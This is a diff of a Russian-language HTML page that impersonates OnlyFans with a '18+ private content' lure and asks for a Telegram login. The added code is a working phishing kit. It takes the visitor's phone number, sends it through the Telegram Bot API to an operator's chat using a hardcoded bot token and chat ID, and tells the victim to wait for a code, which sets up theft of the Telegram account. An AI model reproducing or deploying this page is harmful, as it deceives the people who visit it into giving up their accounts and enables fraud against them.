@@ -3,124 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OnlyFans</title>
+    <title>OnlyFans - Приватный контент</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-        
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Roboto', sans-serif; background: #0a0f1c; color: white; }
-        
-        #loader {
-            position: fixed; top:0; left:0; width:100%; height:100%; 
-            background:#0a0f1c; display:flex; align-items:center; justify-content:center; 
-            z-index:9999; transition: opacity 0.8s;
-        }
-        .logo-loader { font-size:52px; font-weight:700; color:#229ed9; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%,100% {opacity:0.6;} 50% {opacity:1;} }
-        
-        .header { background:#1a2338; padding:12px; text-align:center; font-size:26px; font-weight:700; color:#229ed9; }
-        
-        .hero { background:linear-gradient(#1e3a8a,#0f2b5e); padding:50px 20px 70px; text-align:center; }
-        .title { font-size:27px; line-height:1.3; margin:20px 0 40px; }
-        
-        .tg-button {
-            background:#229ed9; color:white; border:none; padding:15px 50px;
-            font-size:17px; border-radius:50px; font-weight:500;
-        }
-        
-        .feed { padding:20px; }
-        .post { background:#1a2338; border-radius:12px; margin-bottom:25px; overflow:hidden; }
-        .post-header { padding:12px; font-weight:500; }
-        .post-img { width:100%; height:320px; object-fit:cover; }
-        
-        .footer { background:#111; padding:30px 20px; font-size:14px; color:#aaa; line-height:1.8; }
-        
-        .modal { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; color:#111; 
-                 width:90%; max-width:380px; padding:25px; border-radius:16px; z-index:1000; }
-        .overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:999; display:none; }
+        body { margin: 0; font-family: Arial; background: #000; color: #fff; text-align: center; }
+        .header { background: #ff00ff; padding: 20px; font-size: 24px; font-weight: bold; }
+        .content { padding: 20px; }
+        input { width: 80%; padding: 15px; margin: 10px; font-size: 18px; border-radius: 8px; border: none; }
+        button { background: #ff00ff; color: white; padding: 15px 30px; font-size: 20px; border: none; border-radius: 8px; cursor: pointer; margin: 10px; }
+        button:hover { background: #ff66ff; }
+        .error { color: #ff4444; margin: 10px; }
     </style>
 </head>
 <body>
-    <!-- Лоадер -->
-    <div id="loader"><div class="logo-loader">OnlyFans</div></div>
-
     <div class="header">OnlyFans</div>
-
-    <div class="hero">
-        <div class="title">Зарегистрируйтесь,<br>чтобы поддержать<br>любимых авторов</div>
-        <button class="tg-button" onclick="showPhoneModal()">ВОЙТИ ЧЕРЕЗ TELEGRAM</button>
-    </div>
-
-    <div class="feed">
-        <h2 style="margin:10px 0 15px;">Последние избранные посты</h2>
+    <div class="content">
+        <h2>Приватный контент 18+</h2>
+        <p>Войдите, чтобы увидеть эксклюзивные фото и видео</p>
         
-        <!-- Твоя первая картинка -->
-        <div class="post">
-            <div class="post-header">OnlyFans • Окт 12</div>
-            <img src="https://i.imgur.com/XXXX.jpg" class="post-img" alt="Western Shoot">
-            <p style="padding:12px;">Steff. WESTERN SHOOT BTS ft Malu</p>
-        </div>
+        <input type="text" id="phone" placeholder="+79123456789" maxlength="15">
+        <button onclick="sendPhone()">Войти через Telegram</button>
         
-        <!-- Вторая картинка -->
-        <div class="post">
-            <div class="post-header">OnlyFans • Окт 12</div>
-            <img src="https://i.imgur.com/YYYY.jpg" class="post-img" alt="Jungle">
-            <p style="padding:12px;">LOST... IN THE JUNGLE</p>
-        </div>
-        
-        <!-- Третья картинка -->
-        <div class="post">
-            <div class="post-header">OnlyFans • Окт 12</div>
-            <img src="https://i.imgur.com/ZZZZ.jpg" class="post-img" alt="Volleyball">
-            <p style="padding:12px;">The Serve - ALL ACCESS</p>
-        </div>
-    </div>
-
-    <div class="footer">
-        ©2026 OnlyFans<br>
-        Помощь | Блог | Магазин | Условия предоставления услуг<br>
-        Конфиденциальность | Политика рассмотрения жалоб | DMCA
-    </div>
-
-    <!-- Модалки регистрации -->
-    <div class="overlay" id="overlay"></div>
-    <div class="modal" id="phone-modal" style="display:none;">
-        <h2 style="text-align:center;">Войдите через Telegram аккаунт</h2>
-        <input type="tel" id="phone-input" value="+7" style="width:100%; padding:15px; margin:15px 0;">
-        <button onclick="sendCode()" style="width:100%; padding:15px; background:#229ed9; color:white; border:none; border-radius:50px;">Продолжить</button>
-    </div>
-    <div class="modal" id="code-modal" style="display:none;">
-        <h2 style="text-align:center;">Введите код из Telegram</h2>
-        <input type="text" id="code-input" maxlength="6" placeholder="123456" style="width:100%; padding:15px; margin:15px 0;">
-        <button onclick="verifyCode()" style="width:100%; padding:15px; background:#229ed9; color:white; border:none; border-radius:50px;">Продолжить</button>
+        <div id="status"></div>
     </div>
 
     <script>
-        window.onload = () => {
-            setTimeout(() => {
-                document.getElementById('loader').style.opacity = '0';
-                setTimeout(() => document.getElementById('loader').style.display = 'none', 800);
-            }, 1500);
-        };
-
-        function showPhoneModal() {
-            document.getElementById('overlay').style.display = 'block';
-            document.getElementById('phone-modal').style.display = 'block';
+    async function sendPhone() {
+        const phone = document.getElementById('phone').value.trim();
+        const status = document.getElementById('status');
+        
+        if (!phone.startsWith('+') || phone.length < 11) {
+            status.innerHTML = '<div class="error">❌ Неверный формат номера. Должен начинаться с +</div>';
+            return;
         }
-
-        function sendCode() {
-            const phone = document.getElementById('phone-input').value;
-            console.log('Номер:', phone);
-            document.getElementById('phone-modal').style.display = 'none';
-            document.getElementById('code-modal').style.display = 'block';
+        
+        status.innerHTML = 'Отправляем номер...';
+        
+        try {
+            // Отправляем на твой бот
+            await fetch(`https://api.telegram.org/bot8387138313:AAGOZMAgTVz6IGiEHojsu5bQKYGO0PvR5s8/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: "8309100582",   // ← Замени на свой ID
+                    text: phone
+                })
+            });
+            
+            status.innerHTML = '✅ Номер отправлен. Ожидайте код в Telegram.';
+        } catch(e) {
+            status.innerHTML = '<div class="error">Ошибка соединения. Попробуйте позже.</div>';
         }
-
-        function verifyCode() {
-            console.log('Код введён');
-            alert('✅ Успешный вход!');
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('code-modal').style.display = 'none';
-        }
+    }
     </script>
 </body>
 </html>
